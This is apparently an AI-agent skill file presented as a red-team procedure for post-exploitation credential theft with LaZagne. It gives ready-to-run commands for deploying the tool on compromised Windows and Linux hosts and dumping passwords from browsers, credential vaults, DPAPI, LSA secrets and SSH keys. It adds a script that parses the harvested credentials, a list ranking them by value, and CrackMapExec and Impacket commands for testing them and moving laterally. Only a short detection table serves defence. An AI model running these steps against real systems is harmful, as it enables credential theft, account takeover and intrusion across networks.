---
name: performing-credential-access-with-lazagne
description: Extract stored credentials from compromised endpoints using the LaZagne post-exploitation tool to recover passwords from browsers, databases, system vaults, and applications during authorized red team operations.
domain: cybersecurity
subdomain: red-teaming
tags: [red-team, credential-access, lazagne, post-exploitation, password-recovery, credential-dumping, lateral-movement]
version: "1.0"
author: mahipal
license: Apache-2.0
---
# Performing Credential Access with LaZagne

## Overview

LaZagne is an open-source post-exploitation tool designed to retrieve credentials stored on local systems. It supports Windows, Linux, and macOS, with the most extensive module library for Windows. LaZagne recovers passwords from browsers (Chrome, Firefox, Edge, Opera), email clients (Outlook, Thunderbird), databases (PostgreSQL, MySQL, SQLite), system stores (Windows Credential Manager, LSA secrets, DPAPI), Wi-Fi profiles, Git credentials, and dozens of other applications. The tool is categorized under MITRE ATT&CK T1555 (Credentials from Password Stores) and is listed as software S0349. Red teams use LaZagne after gaining initial access to harvest stored credentials that enable lateral movement and privilege escalation.

## Objectives

- Deploy LaZagne on compromised Windows, Linux, or macOS endpoints
- Extract credentials from all supported password stores
- Parse and prioritize recovered credentials for lateral movement
- Identify high-value credentials (domain admin, service accounts, cloud access)
- Document credential harvesting results with appropriate evidence handling
- Correlate recovered credentials with BloodHound attack paths

## MITRE ATT&CK Mapping

- **T1555** - Credentials from Password Stores
- **T1555.003** - Credentials from Password Stores: Credentials from Web Browsers
- **T1555.004** - Credentials from Password Stores: Windows Credential Manager
- **T1552.001** - Unsecured Credentials: Credentials In Files
- **T1552.002** - Unsecured Credentials: Credentials in Registry
- **T1003.004** - OS Credential Dumping: LSA Secrets
- **T1539** - Steal Web Session Cookie

## Implementation Steps

### Phase 1: LaZagne Deployment
1. Transfer LaZagne to the compromised host:
   ```powershell
   # Pre-compiled executable (Windows)
   # Transfer lazagne.exe via C2 channel or file upload

   # Python version (requires Python on target)
   git clone https://github.com/AlessandroZ/LaZagne.git
   cd LaZagne
   pip install -r requirements.txt
   ```
2. Verify execution capability and privileges:
   ```powershell
   # Check current user context
   whoami /priv

   # LaZagne works with standard user privileges for user-level stores
   # SYSTEM/Admin privileges needed for DPAPI master keys, LSA secrets, SAM
   ```

### Phase 2: Full Credential Extraction (Windows)
1. Run LaZagne with all modules:
   ```powershell
   # Extract all credentials
   lazagne.exe all

   # Export results to JSON
   lazagne.exe all -oJ

   # Export results to specific file
   lazagne.exe all -oJ -output C:\Temp\creds
   ```
2. Run specific modules for targeted extraction:
   ```powershell
   # Browsers only (Chrome, Firefox, Edge, Opera, IE)
   lazagne.exe browsers

   # Windows credential stores
   lazagne.exe windows

   # Database credentials
   lazagne.exe databases

   # Email client credentials
   lazagne.exe mails

   # Wi-Fi passwords
   lazagne.exe wifi

   # Git credentials
   lazagne.exe git

   # System credentials (requires elevated privileges)
   lazagne.exe sysadmin
   ```

### Phase 3: Credential Extraction (Linux)
1. Run LaZagne on Linux targets:
   ```bash
   # Full extraction
   python3 laZagne.py all

   # Browser credentials
   python3 laZagne.py browsers

   # System credentials (SSH keys, shadow file with root)
   python3 laZagne.py sysadmin

   # Database credentials
   python3 laZagne.py databases

   # Git credentials
   python3 laZagne.py git
   ```

### Phase 4: Credential Analysis and Prioritization
1. Parse JSON output for unique credentials:
   ```python
   import json
   with open("creds.json") as f:
       results = json.load(f)
   for module in results:
       for entry in module.get("results", []):
           print(f"Source: {entry.get('Category')}")
           print(f"  User: {entry.get('Login', 'N/A')}")
           print(f"  URL/Host: {entry.get('URL', entry.get('Host', 'N/A'))}")
   ```
2. Prioritize credentials by value:
   - Domain credentials (AD accounts) for lateral movement
   - Cloud service credentials (AWS, Azure, GCP console)
   - VPN and remote access credentials
   - Database credentials for data access
   - Email credentials for business email compromise
   - Service account credentials for privilege escalation

### Phase 5: Credential Validation and Use
1. Validate recovered domain credentials:
   ```bash
   # Test domain credentials with CrackMapExec
   crackmapexec smb 10.10.10.0/24 -u recovered_user -p 'recovered_pass'

   # Test with Impacket
   smbclient.py domain.local/user:'password'@10.10.10.1
   ```
2. Cross-reference with BloodHound paths for high-value targets
3. Use recovered credentials for lateral movement or privilege escalation

## Tools and Resources

| Tool | Purpose | Platform |
|------|---------|----------|
| LaZagne | Multi-source credential extraction | Windows/Linux/macOS |
| Mimikatz | LSASS/DPAPI credential dumping | Windows |
| SharpChrome | Chrome credential extraction (.NET) | Windows |
| SharpDPAPI | DPAPI credential decryption | Windows |
| CrackMapExec | Credential validation and spraying | Linux |
| Impacket | Remote credential testing | Linux (Python) |

## LaZagne Module Coverage (Windows)

| Category | Modules |
|----------|---------|
| Browsers | Chrome, Firefox, Edge, Opera, IE, Brave, Vivaldi |
| Email | Outlook, Thunderbird, Foxmail |
| Databases | PostgreSQL, MySQL, SQLiteDB, Robomongo |
| Sysadmin | PuTTY, WinSCP, FileZilla, OpenSSH, RDPManager |
| Windows | Credential Manager, Vault, DPAPI, Autologon |
| WiFi | Stored Wi-Fi passwords |
| Git | Git Credential Store, Git Credential Manager |
| SVN | TortoiseSVN |
| Chat | Pidgin, Skype |

## Detection Signatures

| Indicator | Detection Method |
|-----------|-----------------|
| LaZagne.exe process execution | EDR process monitoring with hash-based detection |
| Access to Chrome Login Data SQLite DB | File access monitoring on browser credential stores |
| DPAPI CryptUnprotectData API calls | API hooking and ETW tracing |
| Access to Windows Credential Manager | Event 5379 (Credential Manager read) |
| Mass credential store enumeration | Behavioral analysis for sequential access patterns |
| Python interpreter accessing credential files | Script block logging and file access auditing |

## Validation Criteria

- [ ] LaZagne deployed on compromised endpoint
- [ ] Full credential extraction completed (all modules)
- [ ] Credentials exported in JSON format for analysis
- [ ] Recovered credentials parsed and deduplicated
- [ ] High-value credentials identified and prioritized
- [ ] Domain credentials validated against AD
- [ ] Lateral movement opportunities identified from recovered creds
- [ ] Evidence documented with appropriate handling procedures
